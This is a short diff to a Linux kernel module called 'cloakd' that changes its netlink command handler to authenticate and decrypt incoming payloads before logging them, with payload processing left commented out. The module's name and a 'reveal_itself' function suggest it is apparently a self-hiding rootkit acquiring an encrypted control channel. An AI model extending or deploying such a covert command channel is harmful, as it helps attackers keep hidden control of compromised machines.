@@ -4,6 +4,7 @@
 #include <linux/netlink.h>
 #include <net/sock.h>
 
+#include "crypto.h"
 
 struct cloakd_params 
 {
@@ -58,17 +59,22 @@ static void reveal_itself(void)
  *****************************************************************************/
 static void nl_recv_cmd(struct sk_buff *sk_buf)
 {
-    int pid;        /* pid of the calling process */
-    unsigned char *payload;  /* message payload */
+    int pid;
+    unsigned char *encrypted_payload, *decrypted_payload;
     struct nlmsghdr *msg_hdr;
 
     printk(KERN_INFO "cloakd: netlink command\n");
     msg_hdr = nlmsg_hdr(sk_buf);
     pid = msg_hdr->nlmsg_pid;
-    payload = nlmsg_data(msg_hdr);
+    encrypted_payload = nlmsg_data(msg_hdr);
 
     printk(KERN_INFO "cloakd: pid %d is calling us\n", pid);
-    printk(KERN_INFO "cloakd: payload=\"%s\"\n", payload);
+    printk(KERN_INFO "cloakd: encrypted payload=\"%s\"\n", encrypted_payload);
+
+    decrypted_payload = authenticate_and_decrypt(encrypted_payload);
+    printk(KERN_INFO "cloakd: decrypted payload=\"%s\"\n", decrypted_payload);
+    kfree(decrypted_payload);
+    //process_payload();
 }
 
 static void netlink_init(void)
